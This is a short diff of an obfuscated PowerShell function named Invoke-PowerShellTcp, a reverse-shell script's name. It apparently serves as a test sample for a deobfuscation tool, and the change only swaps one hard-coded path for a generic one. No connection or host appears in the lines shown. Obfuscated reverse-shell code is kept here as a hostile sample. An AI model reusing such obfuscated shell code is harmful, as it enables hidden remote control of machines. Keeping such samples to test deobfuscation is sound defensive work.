@@ -46,7 +46,7 @@ function Invoke-PowerShellTcp {
         ${C`Omm`AndbY`Tes} = ${e`NCO`ding}.GetBytes(${com`Ma`ND})
         ${RECE`I`V`EdC`OmmaND} = ${En`Cod`iNg}.GetString(${c`OMMANDBYt`Es}, 0, 0)
         ${S`EndBa`Ck} = 'lab\demo-user'
-        ${S`EnD`BYtES} = ${enCO`Di`Ng}.GetBytes('C:\Users\411\Documents\安全\ps1Data\powerpeeler\测试\准确性测试')
+        ${S`EnD`BYtES} = ${enCO`Di`Ng}.GetBytes('C:\Users\Public\Documents\sample-data\demo-path')
 
         & Add-Content -Path ${TrAn`s`CRIpt} -Value "RECV> $receivedCommand"
         & Add-Content -Path ${T`Ran`SCrI`PT} -Value "SEND> $($encoding.GetString($sendBytes, 0, 0))"
